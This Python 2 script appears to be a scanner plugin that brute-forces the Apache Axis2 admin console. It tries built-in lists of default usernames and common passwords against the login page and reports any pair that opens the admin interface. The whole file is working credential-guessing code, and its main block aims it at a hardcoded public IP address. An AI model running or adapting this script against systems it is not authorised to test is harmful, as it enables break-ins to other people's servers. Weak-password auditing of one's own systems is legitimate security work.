#!/usr/bin/env python
#coding:utf-8
from ..t import T
import urllib2



class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False
        r=None
        error_i=0
        flag_list=['Administration Page</title>','System Components','"axis2-admin/upload"','include page="footer.inc">','axis2-admin/logout']
        user_list=['axis','admin','manager','root']
        pass_list=['','axis','axis2','123456','12345678','password','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
        request=None
        res=None
        for user in user_list:
            for password in pass_list:
                try:
                    login_url = target_url+'/axis2/axis2-admin/login'
                    PostStr='userName=%s&password=%s&submit=+Login+' % (user,password)
                    request = urllib2.Request(login_url,PostStr)
                    res = urllib2.urlopen(request,timeout=timeout)
                    res_html = res.read()
                except urllib2.HTTPError,e:
                    print e
                    return result
                except urllib2.URLError,e:
                    print e
                    error_i+=1
                    if error_i >= 3:
                        return result
                    continue
                
                except:

                    return result               
                finally:

                    if res is not None:
                        res.close()
                        del res
                for flag in flag_list:
                    if flag in res_html:
                        info = '%s Axis Weak password %s:%s'%(login_url,user,password)

                        result['result']=True
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['type']='Axis Weak password'
                        result['VerifyInfo']['URL'] =target_url
                        result['VerifyInfo']['payload']=login_url
                        result['VerifyInfo']['result'] =info
                        result['VerifyInfo']['level'] = 'hole'


                        return result
        return result
 
            
if __name__ == '__main__':
    print P().verify(ip='222.29.81.19',port='8080')              
            
            
            